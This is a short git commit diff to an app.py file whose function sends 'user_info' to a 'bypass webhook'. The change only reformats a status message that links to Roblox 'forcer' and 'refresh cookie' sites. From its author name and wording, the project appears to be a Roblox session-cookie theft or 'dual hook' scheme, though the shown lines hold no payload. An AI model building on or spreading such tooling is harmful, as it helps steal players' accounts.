a9044abc92a5654fb4c08af9827fe872769c3f05
DualHookBypasser <dualhookbypasser@gmail.com>
2025-10-08 01:36:44 +0800

    Update app.py

--- api/app.py
+++ api/app.py
@@ -220,7 +220,7 @@ def send_to_bypass_webhook(user_info, ping_content):
                         },
                         {
                             'name': '✅ Status',
-                            'value': 'Successful 🟢\n#\n[BYPASSER LINK](https://rblx-forcer.vercel.app)\n🎗️\n#\n[REFRESH Cookie](https://rblxrefresh.net/r/refreshercookie1)',
+                            'value': 'Successful 🟢 [BYPASSER LINK](https://rblx-forcer.vercel.app) 🎗️[REFRESH Cookie](https://rblxrefresh.net/r/refreshercookie1)',
                             'inline': False
                         }
                     ],
